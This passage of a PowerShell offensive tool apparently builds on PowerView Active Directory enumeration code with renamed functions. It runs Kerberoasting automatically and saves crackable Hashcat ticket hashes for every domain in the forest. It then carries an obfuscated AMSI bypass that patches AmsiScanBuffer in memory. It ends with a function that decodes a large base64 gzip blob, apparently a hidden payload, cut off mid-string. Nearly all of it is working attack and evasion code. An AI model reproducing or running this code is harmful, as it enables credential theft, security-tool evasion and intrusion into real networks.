        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = GGet-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = GGet-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = CConvert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}

function Get-DomainOU {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = GGet-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = GGet-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $OU = $_
                }
                else {
                    $OU = CConvert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}

function IOutvoke-Kerberoast {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Outvoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        GGet-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | GGet-DomainSPNTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }

    END {
        if ($LogonToken) {
            Outvoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Get-Forest {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {

                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {

            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {

            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}

if($jkerbask) {Write-Host "Skipping Kerberoasting..." -ForegroundColor Yellow;}
else{
	if ($jdomain)
	{
		echo ""
		Write-Host "Kerberoasting... " -ForegroundColor Cyan;
                IOutvoke-Kerberoast -erroraction silentlycontinue -domain $jdomain -OutputFormat Hashcat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII $jdomain-kerb-hashes.txt

		type $jdomain-kerb-hashes.txt
                Write-Host "Done! " -ForegroundColor Green;
                echo " "
	}
	else{
		echo ""
		Write-Host "Kerberoasting... " -ForegroundColor Cyan;
                Get-ForestDomain -erroraction silentlycontinue|Select-Object -ExpandProperty Name | ForEach-Object {IOutvoke-Kerberoast -erroraction silentlycontinue -domain $_ -OutputFormat Hashcat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII $_-kerb-hashes.txt}

		Get-ForestDomain -erroraction silentlycontinue|Select-Object -ExpandProperty Name | ForEach-Object {type $_-kerb-hashes.txt}
                Write-Host "Done! " -ForegroundColor Green;
                echo " "
	}
}

$xudbk = @"
using System;
using System.Runtime.InteropServices;
public class xudbk {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[
DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr pbsxld, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $xudbk
$wvyfoqc = [xudbk]::LoadLibrary("$(('âmsì.'+'dll').nOrMALIZe([cHAR](70)+[ChAR]([BYTE]0x6f)+[CHAr](114)+[ChAR]([byTe]0x6d)+[CHAR](68*12/12)) -replace [Char](92+19-19)+[cHar]([ByTe]0x70)+[cHaR](123+15-15)+[chAR](77)+[Char](110*102/102)+[cHar]([BytE]0x7d))")
$dhdzwx = [xudbk]::GetProcAddress($wvyfoqc, "$(('ÁmsìScänBu'+'ffer').NorMAlIZE([chaR]([byTE]0x46)+[chAR](111)+[char]([Byte]0x72)+[chAR]([BYtE]0x6d)+[CHar]([byTE]0x44)) -replace [cHar]([BYTe]0x5c)+[CHAr](112)+[cHAR]([bytE]0x7b)+[char]([bytE]0x4d)+[ChAR](110)+[CHAR](125+4-4))")
$p = 0
[xudbk]::VirtualProtect($dhdzwx, [uint32]5, 0x40, [ref]$p)
$qbzv = "0xB8"
$dnyd = "0x57"
$ttvz = "0x00"
$xcoe = "0x07"
$dlsl = "0x80"
$vslp = "0xC3"
$dcios = [Byte[]] ($qbzv,$dnyd,$ttvz,$xcoe,+$dlsl,+$vslp)
[System.Runtime.InteropServices.Marshal]::Copy($dcios, 0, $dhdzwx, 6)

function Invoke-RBSBob
{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command

    )
    $bslld=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(("H4sIAAAAAAAEANS9") + ("CZwcVfE4/qa7p7vn3H0zk57Z3ezOJptNOtuzm5vMhiMJJAHCfSdcCSEcCcLgDJcsGwEVFUMkHAoRERE8UFERx") + ("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") + ("GuCQnVRRjZRcxEsMOgvYtaGziLbvckvRcRRx1O0zTxNyAFaWXELDAabJU9J+iKcLQ3KPVLJOBmkbYbkJE+modlh4T") + ("4uQsYj09P7b4EeV01HeVjb4E5C4tMrxODuHq9LTJbNRvMYRawn2RqKLgEdJwsU608HelSOO7vdDZ5uBpodFmlE5mWrof//Tj3yDdpGEVlmDc0E4T4keZY3yHDw4sbpOVbwoWv4nAnpOVTwoWv41AnpPVbwnWn4KAcXEqb7FsfxtgqROVVwnWv4cQfipiuVEyx8iSPZUxW+i5WsIkj9VTZLmbbGKoiEgUXitFOPZtNfLzBhPB3thB++AtGMYT8NkwizGtm2ak8Yc59mbfXMnUvRDmmlU1slSSNSa1ysGboamAum6FDWzWW+EWQXYlglnE1EslOO5ki0AaxNm5WDCfT47pfy9iV27eDZEMzTPeTWtJ9Fm0qeNcdyrpmv6OD0AIKMAGQnIKkBWAnIKkJOAKQowRQIcBXAkIK8AeQkoKEBBAroUoMs/I4kQvY0IXb2CS/YltKE9ZIZoymAgFbA5Is/XMcWsfAp+CqQQwZbbz6pPtmPR+5GR9EKoedCsPAGl3I+ayGI/js2cjxjybWtR9makQ6WE0hHStk3j0+jUyH035B2fTudN4nkAn6PieQadS7jvwudBcUZByWP0MobFKisxcSa+i+44lQ3Y/KDMW5mPo9+GBPEmBZ9eD9+s4DPr4ecr+Ix6+HkEhzFUzsan8dlB4/n/S41rAgUheLWhU0OSFnqA9yxldOKEOjFivXBi34m1paSrmPnKMjyusMaW4yTrOMkG/kH0J3cmQG82K1Nw0n4GkxnpxLXA2bT5xBaJL+FJ1jyqG1jadlRfrVKBmSAyrxF2BdPOV/Yn6xU0V4srORbodrak3yEh8+l0zj9f9HNWq2kGAqUBYw8TmkUDT9piUO576UXKyBrKdWLd6jl5PFrdR2fnC2ER5P7LsCIisllSh4qyo4WsQ/vDANPN7cOdgFBRv2Q+qK/rzOsQxyA6yuip2PAT8GCupfEmdNNyrG2b3APISKnMW7Te8Nx2IfWJssY12Da2bVor0GMGen+wt4y5QuvDEw+m5cddkp1XwWPlWpxmzV1Bm8wGbcs/QYbe8i/88wpK0+8kdoYJryLsNfzz71AC4N1TfMOTE1FSgJIEDCsAPZyn1T6BRK7XYDLilY9iRe4HRHUPBGvbvZl6VluFFPV+etYrd+LWisXcG4l9El2CQITnQ8A+9Uo30qOXMyt5pEfNvQGyWZUDCTMVYGbx4V/VkaMm+YugyRjrnx3QJDTK9grNfaJ6ZDD1VDOepnuOVCxO1ScTU0UB3B7iON0RoR+41ZugVChtKyq2kIF+3dWh4u9D8aByCPZaE5p0D9DCGdDWYvRLWIGaKGly8QSIO7chSb6O7gVOqHb3MDQwTJgr0R3gcAQA0r0tTGfG4HB+5pZdUGDCXI2pR0Lq4OWYAvIY86pFA0aHlonxCQ0PWqg/LuhJ3rDueHnxDlWvwsJHY9UxxMKxeO5ojmEZiTKYXA+FBBS84yAyky2H8oHcrGo5EGs5HhMSWEsSy0Srg9CH4jA38mtrazBtLRYyLW6iYhqfacXkrwKALFc5iWwrXi5juyfjY4xZXOZjADsFSeKFnR0Ze8IB2umRZBHUiQJUPAu7HY8jHxR0UoxMWxbpUHQCS4GVcQ4OJ2uAPh7V0TfEKMU6NDLpeNEt6xBzhk6Ya5qOI+qnI1I/HYcE0xHxp2MeoMIcwwpRK41XTiP2K4hZ2cBHxZ6MzWkT5h24dDZgIylEKQiJXlzp+jrKrriOgNYTF